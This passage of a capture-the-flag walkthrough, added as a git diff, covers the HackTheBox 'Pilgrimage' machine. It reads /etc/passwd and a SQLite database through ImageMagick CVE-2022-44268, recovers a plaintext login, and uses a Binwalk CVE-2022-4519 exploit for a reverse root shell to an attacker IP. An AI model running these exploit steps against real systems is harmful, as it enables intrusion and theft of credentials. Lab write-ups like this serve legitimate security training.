@@ -163,3 +163,167 @@ I was able to find a CVE POC for a lower verions on github that seems to work he
 
 ### <mark style="color:blue;">ImageMagick LFI - CVE-2022-44268</mark>
 
+{% code overflow="wrap" %}
+```shellscript
+python3 generate.py -f "/etc/passwd" -o exploit.png
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (3279).png" alt=""><figcaption></figcaption></figure>
+
+Upload the generated `exploit.png` image to the site
+
+<figure><img src="../../.gitbook/assets/image (3280).png" alt=""><figcaption></figcaption></figure>
+
+Let's download the shrunken image
+
+{% code overflow="wrap" %}
+```shellscript
+wget http://pilgrimage.htb/shrunk/69b168b76de1a.png
+```
+{% endcode %}
+
+To read contents of converted PNG file:
+
+{% code overflow="wrap" %}
+```shellscript
+identify -verbose 69b168b76de1a.png
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (3281).png" alt=""><figcaption></figcaption></figure>
+
+I'll take this ASCII output and convert it using [**cyberchef**](https://gchq.github.io/CyberChef/)
+
+<figure><img src="../../.gitbook/assets/image (3282).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (3284).png" alt=""><figcaption></figcaption></figure>
+
+`emily` stands out. I tried looking in her home directory for an SSH key but found none.
+
+The source code for `login.php` shows the site running a SQLite DB
+
+<figure><img src="../../.gitbook/assets/image (3285).png" alt=""><figcaption></figcaption></figure>
+
+I'll try grabbing the file
+
+{% code overflow="wrap" %}
+```shellscript
+python3 generate.py -f "/var/db/pilgrimage" -o exploit.png
+```
+{% endcode %}
+
+Upload the malicious image and downlad the shrunken version.
+
+{% code overflow="wrap" %}
+```shellscript
+wget http://pilgrimage.htb/shrunk/69b16d338dcb5.png
+```
+{% endcode %}
+
+{% code overflow="wrap" %}
+```shellscript
+identify -verbose 69b16d338dcb5.png
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (3286).png" alt=""><figcaption></figcaption></figure>
+
+I am not going to use cyberchef, I'll try converting it to its original binary form. I'll isolate the lines with the hex data and then use `xxd` to convert it back to binary
+
+{% code overflow="wrap" %}
+```shellscript
+identify -verbose 69b16d338dcb5.png | grep -Pv "^( |Image)"  | xxd -r -p > pilgrimage.sqlite
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (3287).png" alt=""><figcaption></figcaption></figure>
+
+#### <mark style="color:$primary;">DB Enumeration</mark>
+
+<figure><img src="../../.gitbook/assets/image (3288).png" alt=""><figcaption></figcaption></figure>
+
+we got emily's credentials they might work over SSH
+
+{% code overflow="wrap" %}
+```shellscript
+emily:abigchonkyboi123
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (3289).png" alt=""><figcaption></figcaption></figure>
+
+## <mark style="color:$success;">Post Exploitation</mark>
+
+### <mark style="color:blue;">Shell as emily</mark>
+
+#### <mark style="color:$primary;">Manual Enumeration</mark>
+
+{% code overflow="wrap" %}
+```
+ps aux
+```
+{% endcode %}
+
+I found two interesting process that are being run by the root user:
+
+<figure><img src="../../.gitbook/assets/image (3291).png" alt=""><figcaption></figcaption></figure>
+
+{% code title="malwarescan.sh" overflow="wrap" %}
+```shellscript
+#!/bin/bash
+
+blacklist=("Executable script" "Microsoft executable")
+
+/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
+        filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
+        binout="$(/usr/local/bin/binwalk -e "$filename")"
+        for banned in "${blacklist[@]}"; do
+                if [[ "$binout" == *"$banned"* ]]; then
+                        /usr/bin/rm "$filename"
+                        break
+                fi
+        done
+done
+```
+{% endcode %}
+
+The script uses **Binwalk**, a tool that searches binary images for embedded files and executable code to analyze uploaded images. If the image is not a permitted file type, the script removes it from the server.&#x20;
+
+The important aspect is that the program has **root permissions**. Let’s examine Binwalk's version for potential vulnerabilities.
+
+<figure><img src="../../.gitbook/assets/image (3292).png" alt=""><figcaption></figcaption></figure>
+
+We got a version
+
+Searchsploit reveals an RCE for our exact version
+
+<figure><img src="../../.gitbook/assets/image (3293).png" alt=""><figcaption></figcaption></figure>
+
+### <mark style="color:blue;">Binwalk v2.3.2 RCE - CVE-2022-4519</mark>
+
+Steps to execute exploit:
+
+* First, we use the exploit on our local computer to create an image that is infected with malicious code.
+
+{% code overflow="wrap" %}
+```shellscript
+python3 51249.py exploit.png 10.10.16.63 443
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (3298).png" alt=""><figcaption></figcaption></figure>
+
+It will generate an image we will upload to the target machine, but firt
+
+* Setup a listener on the same port that we set for the exploit.
+
+<figure><img src="../../.gitbook/assets/image (3295).png" alt=""><figcaption></figcaption></figure>
+
+* Lastly, transfer the contaminated image to the server and relocate the file to the `/var/www/pilgrimage.htb/shrunk` directory.
+
+<figure><img src="../../.gitbook/assets/image (3299).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (3300).png" alt=""><figcaption></figcaption></figure>
+
+and we got a shell as the root user
